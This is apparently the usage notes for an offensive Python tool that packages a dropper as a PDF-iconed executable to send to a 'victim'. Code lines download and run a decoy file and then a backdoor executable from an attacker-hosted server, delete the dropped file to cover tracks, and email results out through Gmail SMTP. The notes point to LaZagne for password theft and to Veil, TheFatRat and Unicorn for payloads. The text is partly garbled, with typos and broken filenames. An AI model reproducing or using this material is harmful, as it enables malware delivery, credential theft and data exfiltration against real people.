# -malwarepackager3.py
requirements::
pyinstaller :: pip3 install pyinstaller

packaging :: for making executable
pyinstaller malwarepackager3.py --icon pdf.icon

useage:: python3 malwarepacker3.py

victim :: Send .exe to victim

this program you can edit the code easily by removing the comments




:: you can add malware eg:::veil:fatrat:unicorn (subprocess.call)
:: for password recover or hacking passwords use lazagne(subprocess.call)


editing the code ::
downloads("http://192.168.1.1/you file an img:pdf:video:with exetension:")
results=subprocess.Popen("img:pdf:video:full name with extension",shell=True)

downloads("http://192.168.1.1/img.jpg:")
results=subprocess.Popen("img.jpg",shell=True)
#first file eg:: img::pdf:video: hosted on your apache server or direct link the file


#to execute the file:::
downloads("http://192.168.1.1/yourmalware.exe backdoor")
results=subprocess.call("yourmalware.rxr",shell=True)

os.remove("yourbackdoor or malicous file that was run by the subprocess.call command:: yourmalware.exe::")


#send_mainfuntions::

#for reciving the mail if you needed use lazagne or any reporting tool
def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email, message)
    server.quit()

###
#for send_mail functions to call remove comment# for using this functions:::
#send_mail("rave@gmail.com","password",results)


